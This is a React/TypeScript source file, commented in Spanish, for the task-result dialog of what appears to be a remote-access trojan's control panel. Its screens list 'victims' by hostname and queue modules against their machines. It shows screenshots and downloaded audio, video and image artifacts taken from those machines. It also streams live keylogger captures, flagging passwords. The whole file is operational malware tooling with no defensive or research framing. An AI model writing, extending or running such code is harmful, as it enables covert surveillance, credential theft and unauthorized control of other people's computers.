'use client';
import { useCallback, useEffect, useRef, useState } from 'react';
import { Copy, Download as DownloadIcon, History, Play, RefreshCw } from 'lucide-react';
import { Input, Textarea } from '@/components/ui/input';
import { api, ApiError } from '@/lib/api';
import { mutate } from '@/hooks/useApi';
import { cn } from '@/lib/cn';
import { dateTime } from '@/lib/format';
import type { Victim } from '@/lib/types';
import type { ModuleEntry } from '@/lib/modules';
import { canPreview, resolveSteps, resultFileName } from '@/lib/modules';
import { toast } from 'sonner';

type TaskStatus = 'queued' | 'running' | 'done' | 'error' | 'cancelled' | 'expired' | 'unknown';

type RemoteTask = {
  id: string;
  victimId: string;
  name: string;
  status: TaskStatus;
  error: string | null;
  result: Record<string, unknown> | null;
  createdAt: string;
  finishedAt: string | null;
};

type Attachment = { key: string; label: string; mime: string; url: string; size: number };

type Frame = { ts: number; data: string };
type Keylog = { id: string; ts: string; process: string; title: string; text: string; password: boolean };

type DialogMode = 'input' | 'running' | 'result' | 'error';

const TERMINAL: TaskStatus[] = ['done', 'error', 'cancelled', 'expired', 'unknown'];

function isErrorLike(status: TaskStatus): boolean {
  return status === 'error' || status === 'cancelled' || status === 'expired' || status === 'unknown';
}

function frameList(result: Record<string, unknown> | null | undefined): Frame[] {
  const frames = result?.frames;
  if (!Array.isArray(frames)) return [];
  return frames.flatMap((frame) => {
    if (!frame || typeof frame !== 'object') return [];
    const item = frame as { ts?: number; data?: string };
    return typeof item.data === 'string' ? [{ ts: Number(item.ts ?? 0), data: item.data }] : [];
  });
}

function resultText(result: Record<string, unknown> | null | undefined): string {
  if (!result) return '';
  if (typeof result.output === 'string') return result.output;
  if (typeof result.text === 'string') return result.text;
  if (typeof result.message === 'string' && Object.keys(result).length === 1) return result.message;
  return JSON.stringify(result, null, 2);
}

function taskText(task: RemoteTask): string {
  if (task.error) return `ERROR (${task.error})\n`;
  if (isErrorLike(task.status)) return `TAREA ${task.status.toUpperCase()}${task.error ? ` (${task.error})` : ''}\n`;
  return resultText(task.result);
}

function downloadBlob(name: string, body: string, type = 'text/plain;charset=utf-8'): void {
  const blob = new Blob([body], { type });
  const url = URL.createObjectURL(blob);
  const anchor = document.createElement('a');
  anchor.href = url;
  anchor.download = name;
  anchor.style.display = 'none';
  document.body.appendChild(anchor);
  anchor.click();
  anchor.remove();
  window.setTimeout(() => URL.revokeObjectURL(url), 30_000);
}

const FOCUSABLE = 'button:not([disabled]), a[href], input:not([disabled]), textarea:not([disabled]), select:not([disabled]), [tabindex]:not([tabindex="-1"])';

/**
 * Modal de resultado de un módulo. Diálogo clásico XP con barra de título,
 * visor crudo, metadatos, descargas y reintento.
 *
 * §3.1–3.7: el output se muestra EXACTO y completo (solo se envuelve en el
 * visor), nunca se resume. Los binarios llegan como artefactos de la tarea y se
 * previsualizan/descargan. El histórico queda reabrible desde el menú.
 *
 * PROTOCOLO: el streaming incremental se implementa por polling del endpoint
 * de tareas (700 ms) porque el stream WS del panel solo publica `task.update`
 * sin payload de salida. Si el agente añade frames incrementales, basta con
 * pintar `task.result.output` según llega: el visor ya es incremental.
 */
export function ModuleResultDialog({
  open,
  victim,
  entry,
  reopenTask,
  onClose
}: {
  open: boolean;
  victim: Victim | null;
  entry: ModuleEntry | null;
  reopenTask?: RemoteTask | null;
  onClose: () => void;
}) {
  const [mode, setMode] = useState<DialogMode>('input');
  const [status, setStatus] = useState<'idle' | 'running' | 'done' | 'error'>('idle');
  const [output, setOutput] = useState('');
  const [error, setError] = useState<{ code: string; message: string } | null>(null);
  const [tasks, setTasks] = useState<RemoteTask[]>([]);
  const [inputValue, setInputValue] = useState('');
  const [selectedTask, setSelectedTask] = useState<RemoteTask | null>(null);
  const [attachments, setAttachments] = useState<Attachment[]>([]);
  const [copied, setCopied] = useState(false);
  const [liveText, setLiveText] = useState('');

  const pollTimer = useRef<ReturnType<typeof setInterval> | null>(null);
  const knownIds = useRef<Set<string>>(new Set());
  const dialog = useRef<HTMLDivElement>(null);
  const restoreFocus = useRef<HTMLElement | null>(null);
  const copiedTimer = useRef<number | null>(null);
  const liveSeen = useRef<Set<string>>(new Set());
  const liveBox = useRef<HTMLPreElement>(null);

  const isLocal = entry?.kind === 'local';
  const isRunnable = Boolean(entry && entry.implemented && entry.kind !== 'none' && entry.kind !== 'local');

  /* ═══════════════════════════════════════════════════════════════════
     UTILIDADES
     ═══════════════════════════════════════════════════════════════════ */

  const stopPoll = useCallback(() => {
    if (pollTimer.current) {
      clearInterval(pollTimer.current);
      pollTimer.current = null;
    }
  }, []);

  const close = useCallback(() => {
    stopPoll();
    onClose();
  }, [onClose, stopPoll]);

  const selectTask = useCallback((task: RemoteTask) => {
    setSelectedTask(task);
    setStatus(isErrorLike(task.status) ? 'error' : 'done');
    setOutput(taskText(task));
    setError(isErrorLike(task.status) ? { code: task.status === 'error' ? 'task_error' : task.status, message: task.error ?? `La tarea terminó en estado ${task.status}.` } : null);
    setMode(isErrorLike(task.status) ? 'error' : 'result');
  }, []);

  const loadHistory = useCallback(async () => {
    if (!victim || !entry) return;
    const key = entry.historyKey ?? entry.task;
    if (!key) return;
    try {
      const data = await api<{ items: RemoteTask[] }>(
        `/tasks?victim=${encodeURIComponent(victim.id)}&name=${encodeURIComponent(key)}&limit=25`
      );
      setTasks((data.items ?? []).sort((a, b) => b.createdAt.localeCompare(a.createdAt)));
    } catch {
      setTasks([]);
    }
  }, [victim, entry]);

  const loadArtifacts = useCallback(async (ids: string[]) => {
    const collect = async (): Promise<Attachment[]> => {
      const found: Attachment[] = [];
      for (const id of ids) {
        try {
          const data = await api<{ items: Array<{ id: string; module: string; files: Array<{ path: string; size: number; mime: string; url: string }> }> }>(
            `/tasks/${id}/artifacts`
          );
          for (const artifact of data.items ?? []) {
            for (const file of artifact.files ?? []) {
              found.push({
                key: `${id}:${artifact.id}:${file.path}`,
                label: `${artifact.module}/${file.path.split('/').pop() ?? 'archivo'}`,
                mime: file.mime,
                url: `${file.url}${file.url.includes('?') ? '&' : '?'}inline=1`,
                size: file.size
              });
            }
          }
        } catch {
          /* un artefacto ausente no invalida el resultado */
        }
      }
      return found;
    };

    let found = await collect();
    // El agente sube el artefacto después de cerrar la tarea: si el módulo es
    // binario, se reintenta brevemente mientras procesa el manifiesto.
    if (entry?.binary) {
      for (let attempt = 0; attempt < 5 && found.length === 0; attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, 800));
        found = await collect();
      }
    }
    setAttachments(found);
  }, [entry?.binary]);

  /** Compone la salida de todas las tareas conocidas, en orden de creación. */
  const composeOutput = useCallback((items: RemoteTask[]): string => {
    const ordered = [...items].sort((a, b) => a.createdAt.localeCompare(b.createdAt));
    if (ordered.length <= 1) return ordered[0] ? taskText(ordered[0]) : '';
    return ordered
      .map((task) => `──────── ${task.name} · ${task.id.slice(0, 8)} · ${task.status} ────────\n${taskText(task)}`)
      .join('\n');
  }, []);

  /* ═══════════════════════════════════════════════════════════════════
     EJECUCIÓN Y STREAMING
     ═══════════════════════════════════════════════════════════════════ */

  const runLocal = useCallback(() => {
    if (!entry?.localExecute) return;
    let result: { output: string; title: string; ext?: string };
    try {
      result = entry.localExecute(inputValue || undefined);
    } catch (caught) {
      setMode('error');
      setStatus('error');
      setError({ code: 'local_error', message: caught instanceof Error ? caught.message : String(caught) });
      setOutput(`[Error local]\n${caught instanceof Error ? caught.stack ?? caught.message : String(caught)}\n`);
      return;
    }
    setOutput(result.output);
    setStatus('done');
    setMode('result');
    setAttachments([]);
    void toast.success('Módulo ejecutado en el panel (sin tarea del agente)');
  }, [entry, inputValue]);

  const finish = useCallback(
    async (items: RemoteTask[]) => {
      stopPoll();
      const ordered = [...items].sort((a, b) => a.createdAt.localeCompare(b.createdAt));
      const failed = ordered.find((task) => isErrorLike(task.status));
      const text = composeOutput(ordered);
      setOutput(text);

      if (failed) {
        setStatus('error');
        setMode('error');
        setError({
          code: failed.status === 'error' ? 'task_error' : failed.status,
          message: failed.error ?? `La tarea terminó en estado ${failed.status}.`
        });
      } else {
        setStatus('done');
        setMode('result');
        setError(null);
      }
      const last = ordered.at(-1) ?? null;
      const preview = [...ordered].reverse().find((task) => frameList(task.result).length > 0) ?? last;
      setSelectedTask(preview);
      await loadArtifacts(ordered.map((task) => task.id));
    },
    [composeOutput, loadArtifacts, stopPoll]
  );

  const startPolling = useCallback(
    (ids: string[], prefix?: string) => {
      stopPoll();
      setStatus('running');
      setMode('running');
      setOutput(`${prefix ? `${prefix}\n\n` : ''}Ejecutando… esperando respuesta del cliente.\n`);

      pollTimer.current = setInterval(async () => {
        if (!victim) {
          stopPoll();
          return;
        }
        try {
          const data = await api<{ items: RemoteTask[] }>(`/tasks?victim=${encodeURIComponent(victim.id)}&limit=100`);
          const relevant = (data.items ?? [])
            .filter((task) => knownIds.current.has(task.id))
            .sort((a, b) => a.createdAt.localeCompare(b.createdAt));
          if (relevant.length === 0) return;

          // Streaming: cada respuesta sustituye el visor, pero nunca se resume.
          setOutput(composeOutput(relevant));
          setTasks((previous) => {
            const merged = new Map(previous.map((task) => [task.id, task]));
            for (const task of relevant) merged.set(task.id, task);
            return [...merged.values()].sort((a, b) => b.createdAt.localeCompare(a.createdAt));
          });

          const done = relevant.filter((task) => TERMINAL.includes(task.status));
          if (done.length === relevant.length) void finish(relevant);
        } catch {
          /* el polling tolera cortes del panel; se reintenta al siguiente tick */
        }
      }, 700);
    },
    [composeOutput, finish, stopPoll, victim]
  );

  const execute = useCallback(async () => {
    if (!entry || !victim) return;
    setError(null);
    setOutput('');
    setAttachments([]);
    setSelectedTask(null);
    knownIds.current = new Set();

    if (isLocal) {
      runLocal();
      return;
    }
    if (!isRunnable) {
      setMode('error');
      setStatus('error');
      const reason = entry.unsupportedReason ? entry.unsupportedReason(victim) : 'Módulo no implementado en este cliente.';
      setError({ code: 'not_implemented', message: reason });
      setOutput(`[Módulo no disponible]\nMódulo: ${entry.label}\nMotivo: ${reason}\nEstado: no ejecutable contra este cliente.\n`);
      return;
    }

    let steps: ReturnType<typeof resolveSteps>;
    try {
      steps = resolveSteps(entry, victim, inputValue || entry.input?.defaultValue);
    } catch (caught) {
      setMode('error');
      setStatus('error');
      setError({ code: 'module_not_runnable', message: caught instanceof Error ? caught.message : 'Módulo no ejecutable.' });
      setOutput(`[El módulo no se puede ejecutar contra este cliente]\n${caught instanceof Error ? caught.stack ?? caught.message : String(caught)}\n`);
      return;
    }

    setMode('running');
    setStatus('running');
    setOutput('Encolando tarea…\n');

    const created: string[] = [];
    for (const step of steps) {
      try {
        const data = await mutate<{ items: Array<{ id: string }> }>('/tasks', 'POST', {
          victim_ids: [victim.id],
          name: step.name,
          params: step.params,
          timeout_sec: step.timeoutSec
        });
        const id = data.items[0]?.id;
        if (id) {
          created.push(id);
          knownIds.current.add(id);
        }
      } catch (caught) {
        const apiError = caught instanceof ApiError ? caught : new ApiError(0, 'network', 'Sin conexión con el panel');
        const message = apiError.code === 'agent_offline'
          ? 'Sin socket de control: el equipo no está conectado ahora mismo.'
          : apiError.code === 'busy'
            ? 'El agente ya tiene el máximo de tareas en vuelo.'
            : apiError.message;
        setError({ code: apiError.code || String(apiError.status), message });
        setStatus('error');
        setMode('error');
        const detail = `[Fallo al encolar ${step.name}]\nHTTP ${apiError.status || '—'} · ${apiError.code}\n${message}`;
        setOutput(`${detail}\n`);
        stopPoll();
        if (created.length > 0) startPolling(created, detail);
        return;
      }
    }

    if (created.length === 0) {
      setMode('error');
      setStatus('error');
      setError({ code: 'no_tasks_created', message: 'No se pudo encolar ninguna tarea.' });
      setOutput('[No se creó ninguna tarea. Revisa que el equipo tenga socket de control.]\n');
      return;
    }
    startPolling(created);
  }, [entry, inputValue, isLocal, isRunnable, runLocal, startPolling, stopPoll, victim]);

  const reopen = useCallback(
    (task: RemoteTask) => {
      knownIds.current = new Set([task.id]);
      if (task.status === 'queued' || task.status === 'running') {
        startPolling([task.id]);
        return;
      }
      selectTask(task);
      void loadArtifacts([task.id]);
    },
    [loadArtifacts, selectTask, startPolling]
  );

  const retry = useCallback(() => {
    setError(null);
    setOutput('');
    setAttachments([]);
    setSelectedTask(null);
    if (entry?.input) {
      setMode('input');
      setStatus('idle');
      return;
    }
    void execute();
  }, [entry?.input, execute]);

  const fullOutput = liveText ? `${output}\n\n──────── EN VIVO ────────\n${liveText}` : output;

  const copyOutput = useCallback(async () => {
    try {
      await navigator.clipboard.writeText(fullOutput);
      setCopied(true);
      if (copiedTimer.current) window.clearTimeout(copiedTimer.current);
      copiedTimer.current = window.setTimeout(() => setCopied(false), 2_000);
    } catch {
      void toast.error('El portapapeles no está disponible');
    }
  }, [fullOutput]);

  /* ═══════════════════════════════════════════════════════════════════
     CICLO DE VIDA
     ═══════════════════════════════════════════════════════════════════ */

  useEffect(() => {
    if (!open) {
      stopPoll();
      return;
    }
    restoreFocus.current = document.activeElement as HTMLElement | null;
    setMode(entry?.input ? 'input' : 'running');
    setStatus('idle');
    setOutput('');
    setError(null);
    setTasks([]);
    setSelectedTask(null);
    setAttachments([]);
    setLiveText('');
    liveSeen.current = new Set();
    setInputValue(entry?.input?.defaultValue ?? '');
    knownIds.current = new Set();

    if (!entry || !victim) {
      close();
      return;
    }

    void loadHistory();

    if (!entry.implemented || entry.kind === 'none') {
      const reason = entry.unsupportedReason ? entry.unsupportedReason(victim) : 'Módulo no implementado en este cliente.';
      setMode('error');
      setStatus('error');
      setError({ code: 'not_implemented', message: reason });
      setOutput(`[Módulo no disponible]\nMódulo: ${entry.label}\nMotivo: ${reason}\nEstado: no ejecutable contra este cliente.\n`);
      return;
    }
    if (reopenTask) {
      reopen(reopenTask);
      return;
    }
    if (entry.input) return; // el operador introduce la entrada y pulsa Aceptar
    if (entry.kind === 'local') runLocal();
    else void execute();
  }, [open]); // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => {
    if (!open) return;
    const timer = window.setTimeout(() => dialog.current?.focus(), 0);
    return () => window.clearTimeout(timer);
  }, [open, entry?.id]);

  /* Streaming propio del keylogger: el resultado de la tarea solo confirma el
     estado del hook; las pulsaciones nuevas se sondean del endpoint del cliente. */
  useEffect(() => {
    if (!open || entry?.liveSource !== 'keylogs' || !victim) return;
    let cancelled = false;
    let timer: ReturnType<typeof setInterval> | null = null;

    const tick = async () => {
      try {
        const data = await api<{ items: Keylog[] }>(
          `/victims/${encodeURIComponent(victim.id)}/keylogs?limit=100`
        );
        if (cancelled) return;
        const fresh = (data.items ?? [])
          .filter((item) => !liveSeen.current.has(item.id))
          .sort((a, b) => a.ts.localeCompare(b.ts));
        if (fresh.length === 0) return;
        for (const item of fresh) liveSeen.current.add(item.id);
        setLiveText((current) => {
          const lines = fresh.map((item) => {
            const stamp = new Date(item.ts).toLocaleTimeString('es-ES', { hour12: false });
            return `[${stamp}] ${item.process || 'proceso?'} | ${item.title || 'sin ventana'}${item.password ? ' [PASSWORD]' : ''}\n${item.text}`;
          });
          return `${current}${current ? '\n' : ''}${lines.join('\n')}`;
        });
      } catch {
        /* se reintenta en el siguiente tick */
      }
    };

    void tick();
    timer = setInterval(tick, 1_000);
    return () => {
      cancelled = true;
      if (timer) clearInterval(timer);
    };
  }, [open, entry?.liveSource, victim]);

  useEffect(() => {
    if (liveBox.current) liveBox.current.scrollTop = liveBox.current.scrollHeight;
  }, [liveText]);

  useEffect(() => {
    return () => {
      if (copiedTimer.current) window.clearTimeout(copiedTimer.current);
    };
  }, []);

  useEffect(() => {
    if (!open) return;
    const onKey = (event: KeyboardEvent) => {
      if (event.key === 'Escape') {
        event.preventDefault();
        close();
        return;
      }
      if (event.key !== 'Tab' || !dialog.current) return;
      const nodes = [...dialog.current.querySelectorAll<HTMLElement>(FOCUSABLE)];
      if (nodes.length === 0) return;
      const first = nodes[0]!;
      const last = nodes.at(-1)!;
      if (event.shiftKey && document.activeElement === first) {
        event.preventDefault();
        last.focus();
      } else if (!event.shiftKey && document.activeElement === last) {
        event.preventDefault();
        first.focus();
      }
    };
    window.addEventListener('keydown', onKey);
    return () => window.removeEventListener('keydown', onKey);
  }, [open, close]);

  useEffect(() => {
    if (!open) return;
    const previous = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = previous;
      restoreFocus.current?.focus?.();
    };
  }, [open]);

  if (!open || !entry || !victim) return null;

  /* ═══════════════════════════════════════════════════════════════════
     RENDER
     ═══════════════════════════════════════════════════════════════════ */

  const stamp = dateTime(selectedTask?.createdAt ?? new Date().toISOString());
  const frames = selectedTask ? frameList(selectedTask.result) : [];
  const previews = attachments.filter((file) => canPreview(file.mime));
  const consoleVisible = mode === 'running' || mode === 'result' || mode === 'error';
  const frameMode = mode === 'result' && frames.length > 0;
  const title = `${entry.label} — ${victim.hostname}`;

  return (
    <div
      className="xp-dialog-overlay"
      onMouseDown={(event) => {
        if (event.target === event.currentTarget) close();
      }}
    >
      <div
        ref={dialog}
        className="xp-dialog"
        role="dialog"
        aria-modal="true"
        aria-labelledby="xp-dlg-title"
        aria-describedby="xp-dlg-meta"
        tabIndex={-1}
      >
        <div className="xp-dialog-titlebar">
          <span className="xp-dialog-title" id="xp-dlg-title">
            {title}
          </span>
          <div className="xp-dialog-buttons">
            <button type="button" className="xp-dialog-close" onClick={close} aria-label="Cerrar">
              ×
            </button>
          </div>
        </div>

        <div className="xp-dialog-body">
          <div className="xp-dialog-meta" id="xp-dlg-meta">
            <span>
              Víctima: <b>{victim.hostname}</b> · id <span className="font-mono">{victim.id.slice(0, 8)}</span> · {victim.os}
            </span>
            <span>
              Módulo: <b>{entry.label}</b> · {stamp}
            </span>
            <span>
              Estado:{' '}
              <b className={cn(status === 'error' && 'xp-text-bad', status === 'done' && 'xp-text-ok')}>
                {status === 'running' ? 'Ejecutando' : status === 'done' ? 'Completado' : status === 'error' ? 'Error' : 'Listo'}
              </b>
              {selectedTask ? <> · tarea <span className="font-mono">{selectedTask.id.slice(0, 8)}</span></> : null}
            </span>
          </div>

          {/* Entrada del operador */}
          {entry.input && mode === 'input' ? (
            <div className="xp-dialog-section">
              <label className="xp-label" htmlFor="xp-dlg-input">
                {entry.input.label}
              </label>
              {entry.input.multiline ? (
                <Textarea
                  id="xp-dlg-input"
                  className="xp-textarea"
                  value={inputValue}
                  onChange={(event) => setInputValue(event.target.value)}
                  placeholder={entry.input.placeholder}
                  onKeyDown={(event) => {
                    if (event.key === 'Enter' && (event.ctrlKey || event.metaKey)) {
                      event.preventDefault();
                      void execute();
                    }
                  }}
                />
              ) : (
                <Input
                  id="xp-dlg-input"
                  className="xp-input"
                  value={inputValue}
                  onChange={(event) => setInputValue(event.target.value)}
                  placeholder={entry.input.placeholder}
                  onKeyDown={(event) => {
                    if (event.key === 'Enter') {
                      event.preventDefault();
                      void execute();
                    }
                  }}
                />
              )}
              <p className="xp-hint">
                {entry.input.multiline ? 'Ctrl+Enter ejecuta.' : 'Enter ejecuta.'} El resultado quedará en el histórico del cliente.
              </p>
            </div>
          ) : null}

          {/* Streaming / consola */}
          {consoleVisible ? (
            <div className="xp-dialog-section">
              {mode === 'running' ? (
                <p className="xp-running">
                  <span className="xp-spinner" aria-hidden="true" /> Ejecutando contra <b>{victim.hostname}</b>… la salida se actualiza en vivo.
                </p>
              ) : null}
              {mode === 'error' && error ? (
                <p className="xp-error-line" role="alert">
                  <b>{error.code}</b> — {error.message}
                </p>
              ) : null}
              {frameMode ? (
                <details className="xp-raw">
                  <summary>Salida cruda (JSON exacto) · {frames.length} fotogramas</summary>
                  <pre className="xp-dialog-console" aria-live="polite">
                    {output || '(sin salida)'}
                  </pre>
                </details>
              ) : (
                <pre className={cn('xp-dialog-console', mode === 'error' && 'xp-dialog-error-console')} aria-live={mode === 'running' ? 'polite' : undefined}>
                  {output || (mode === 'running' ? 'Esperando respuesta del cliente…' : '(sin salida)')}
                </pre>
              )}
              {entry.liveSource === 'keylogs' ? (
                <>
                  <p className="xp-label xp-live-label">
                    <span className="xp-live-dot" aria-hidden="true" /> En vivo (1 s)
                    <span className="xp-hint">Escribe `on` arriba y pulsa Aceptar para activar el hook.</span>
                  </p>
                  <pre ref={liveBox} className="xp-dialog-console xp-live-console" aria-live="polite">
                    {liveText || 'Sin pulsaciones nuevas todavía…'}
                  </pre>
                </>
              ) : null}
            </div>
          ) : null}

          {/* Fotogramas de monitor */}
          {frames.length > 0 ? (
            <div className="xp-dialog-section">
              <p className="xp-label">Fotogramas ({frames.length})</p>
              <div className="xp-frames">
                {frames.map((frame, index) => (
                  <figure key={`${frame.ts}-${index}`} className="xp-frame">
                    <a href={`data:image/jpeg;base64,${frame.data}`} download={`${resultFileName(entry, victim.hostname, 'jpg').replace(/\.jpg$/, '')}_f${index + 1}.jpg`}>
                      <img src={`data:image/jpeg;base64,${frame.data}`} alt={`Fotograma ${index + 1} de ${victim.hostname}`} loading="lazy" />
                    </a>
                    <figcaption>
                      {frame.ts ? new Date(frame.ts * 1000).toLocaleTimeString('es-ES', { hour12: false }) : `#${index + 1}`}
                    </figcaption>
                  </figure>
                ))}
              </div>
            </div>
          ) : null}

          {/* Artefactos binarios */}
          {attachments.length > 0 ? (
            <div className="xp-dialog-section">
              <p className="xp-label">Artefactos de la tarea</p>
              <div className="xp-attachments">
                {attachments.map((file) => (
                  <div key={file.key} className="xp-attachment">
                    <span className="xp-attachment-name" title={file.label}>{file.label}</span>
                    <a className="xp-btn-classic" href={file.url.replace('&inline=1', '')} download>
                      descargar
                    </a>
                  </div>
                ))}
              </div>
              {previews.map((file) =>
                file.mime.startsWith('image/') ? (
                  <img key={file.key} className="xp-preview" src={file.url} alt={file.label} />
                ) : file.mime.startsWith('audio/') ? (
                  <audio key={file.key} className="xp-preview-audio" src={file.url} controls preload="metadata" />
                ) : file.mime.startsWith('video/') ? (
                  <video key={file.key} className="xp-preview" src={file.url} controls preload="metadata" />
                ) : null
              )}
            </div>
          ) : null}

          {/* Historial reabrible */}
          {tasks.length > 0 ? (
            <div className="xp-dialog-section">
              <p className="xp-label">
                <History className="xp-inline-icon" /> Historial de {entry.label} en este cliente
              </p>
              <div className="xp-history" role="list">
                {tasks.map((task) => (
                  <button
                    key={task.id}
                    type="button"
                    role="listitem"
                    className={cn('xp-history-row', selectedTask?.id === task.id && 'is-current')}
                    onClick={() => reopen(task)}
                    title={`${dateTime(task.createdAt)} · ${task.error ?? task.status}`}
                  >
                    <span className="font-mono">{task.id.slice(0, 8)}</span>
                    <span className={cn('xp-history-status', isErrorLike(task.status) && 'xp-text-bad')}>{task.status}</span>
                    <span>{dateTime(task.createdAt)}</span>
                    {task.error ? <span className="xp-history-error">{task.error}</span> : null}
                  </button>
                ))}
              </div>
            </div>
          ) : null}
        </div>

        <div className="xp-dialog-footer">
          {mode === 'input' ? (
            <>
              <button type="button" className="xp-dialog-btn primary" onClick={() => void execute()}>
                <Play className="xp-inline-icon" /> Aceptar
              </button>
              <button type="button" className="xp-dialog-btn" onClick={close}>
                Cancelar
              </button>
            </>
          ) : null}

          {mode === 'running' ? (
            <>
              <span className="xp-footer-status">
                <span className="xp-spinner" aria-hidden="true" /> en curso
              </span>
              <button type="button" className="xp-dialog-btn" onClick={close}>
                Cerrar
              </button>
            </>
          ) : null}

          {mode === 'result' ? (
            <>
              <button type="button" className="xp-dialog-btn" onClick={copyOutput}>
                <Copy className="xp-inline-icon" /> {copied ? 'Copiado' : 'Copiar'}
              </button>
              <button
                type="button"
                className="xp-dialog-btn"
                onClick={() => {
                  const name = resultFileName(entry, victim.hostname, entry.binary ? 'log' : 'txt');
                  downloadBlob(name, fullOutput);
                  void toast.success(`Descargado: ${name}`);
                }}
              >
                <DownloadIcon className="xp-inline-icon" /> Descargar
              </button>
              <button type="button" className="xp-dialog-btn primary" onClick={retry}>
                <RefreshCw className="xp-inline-icon" /> Ejecutar de nuevo
              </button>
              <button type="button" className="xp-dialog-btn" onClick={close}>
                Cerrar
              </button>
            </>
          ) : null}

          {mode === 'error' ? (
            <>
              <button type="button" className="xp-dialog-btn primary" onClick={retry}>
                <RefreshCw className="xp-inline-icon" /> Reintentar
              </button>
              <button
                type="button"
                className="xp-dialog-btn"
                onClick={() => {
                  const name = resultFileName(entry, victim.hostname, 'log');
                  downloadBlob(name, fullOutput);
                }}
                disabled={!output}
              >
                <DownloadIcon className="xp-inline-icon" /> Guardar error
              </button>
              <button type="button" className="xp-dialog-btn" onClick={close}>
                Cerrar
              </button>
            </>
          ) : null}
        </div>

        <div className="xp-statusbar">
          <span>{status === 'running' ? 'Ejecutando…' : status === 'done' ? 'Completado' : status === 'error' ? 'Error' : 'Listo'}</span>
          <span>·</span>
          <span>{entry.label}</span>
          <span className="ml-auto">{victim.hostname}</span>
        </div>
      </div>
    </div>
  );
}
